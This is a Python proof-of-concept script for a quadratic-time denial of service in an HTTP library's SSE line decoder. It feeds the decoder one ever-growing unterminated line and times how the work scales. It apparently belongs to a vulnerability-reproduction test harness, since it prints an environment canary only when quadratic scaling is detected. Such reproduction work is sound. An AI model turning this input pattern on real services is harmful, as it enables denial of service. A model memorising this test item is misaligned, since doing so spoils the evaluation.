#!/usr/bin/env python3
# PoC for CVE-2026-84378 — quadratic-complexity DoS in httpx2's SSE line decoder.
#
# Vulnerable httpx2 (2.5.0 .. <2.10.0) implements _SSELineDecoder.decode() in
# src/httpx2/httpx2/_sse.py so that every incoming chunk of an *unterminated* SSE
# line causes the whole accumulated buffer to be copied/rescanned again. Feeding one
# line split across k chunks therefore costs O(k^2) work. The 2.10.0 fix
# ("Improve SSE chunk buffering performance", PR #1117) makes this linear.
#
# We drive the changed code directly and measure how processing time scales when the
# number of chunks doubles. A linear decoder scales ~2x; the vulnerable quadratic
# decoder scales ~4x. The canary is emitted ONLY when a clearly super-linear (quadratic)
# scaling is observed -- i.e. only when the vulnerability's primitive is actually
# exercised. On the patched build the scaling is linear, the branch is never taken,
# and nothing is printed.

import os
import sys
import gc
import time
import importlib


def find_decoder_cls():
    """Locate the SSE line-decoder class exactly as named in the advisory."""
    candidates = ("httpx2._sse", "httpx2.httpx2._sse", "httpx2._decoders", "httpx2")
    for modname in candidates:
        try:
            mod = importlib.import_module(modname)
        except Exception:
            continue
        # exact name first
        for attr in ("_SSELineDecoder", "SSELineDecoder"):
            cls = getattr(mod, attr, None)
            if isinstance(cls, type) and hasattr(cls, "decode"):
                return cls
        # otherwise scan for any *SSELineDecoder* defined in the module
        for name in dir(mod):
            if "SSELineDecoder" in name:
                cls = getattr(mod, name, None)
                if isinstance(cls, type) and hasattr(cls, "decode"):
                    return cls
    return None


def probe_kind(cls):
    """Decide whether decode() consumes str or bytes."""
    for kind, sample in (("str", "a"), ("bytes", b"a")):
        try:
            cls().decode(sample)
            return kind
        except Exception:
            continue
    return None


def measure(cls, kind, n_chunks, chunk_text):
    """Feed n_chunks copies of one newline-free fragment to a fresh decoder,
    forming a single ever-growing unterminated SSE line; return elapsed seconds."""
    chunk = chunk_text if kind == "str" else chunk_text.encode("ascii")
    dec = cls().decode  # fresh buffer each run
    gc_was = gc.isenabled()
    gc.disable()
    try:
        t0 = time.perf_counter()
        for _ in range(n_chunks):
            dec(chunk)
        elapsed = time.perf_counter() - t0
    finally:
        if gc_was:
            gc.enable()
    return elapsed


def best(cls, kind, n, chunk_text, reps=5):
    return min(measure(cls, kind, n, chunk_text) for _ in range(reps))


def main():
    cls = find_decoder_cls()
    if cls is None:
        return
    kind = probe_kind(cls)
    if kind is None:
        return

    C = 200
    chunk_text = "a" * C          # no '\r' or '\n' -> one unterminated line
    FLOOR = 0.10                  # grow the workload until it is measurable
    CAP = 150_000

    # Adaptively size N so the base measurement is well above timer noise. On the
    # vulnerable (quadratic) build this floor is reached at a small N; on the patched
    # (linear) build N simply grows to CAP -- either way the ratio test below is valid.
    N = 500
    try:
        while N < CAP:
            if measure(cls, kind, N, chunk_text) >= FLOOR:
                break
            N *= 2
        N = min(N, CAP)

        t1 = best(cls, kind, N, chunk_text)
        t2 = best(cls, kind, 2 * N, chunk_text)
    except Exception:
        return

    if t1 <= 0:
        return

    ratio = t2 / t1
    # Doubling the chunk count: linear -> ~2.0, quadratic -> ~4.0. A ratio well past
    # the midpoint means the O(n^2) rescan-and-copy path (the vulnerability) ran.
    if ratio > 3.0 and t2 > 0.05:
        sys.stdout.write(os.environ["POC_CANARY"] + "\n")
        sys.stdout.flush()


if __name__ == "__main__":
    main()